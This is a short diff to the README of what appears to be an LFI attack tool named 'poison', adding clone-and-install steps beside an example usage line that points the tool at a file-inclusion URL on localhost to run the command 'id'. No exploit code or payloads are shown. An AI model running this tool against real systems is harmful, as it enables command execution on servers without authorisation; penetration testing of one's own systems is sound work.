@@ -6,7 +6,13 @@ all the wordlists and payloads is included
 ![Preview](https://github.com/user-attachments/assets/8d658876-79d6-41f1-9456-91681be9782e)
 
 
-
+## Installation:
+```
+git clone https://github.com/coldt3ars/poison
+cd poison
+pip install -r requirements.txt
+python3 poison.py
+```
 ## Example usage (LFI):
 ```
 ./poison.py -u 'http://127.0.0.1/file.php?file=' -e 'id' -p src/payloads.txt -w src/small.txt
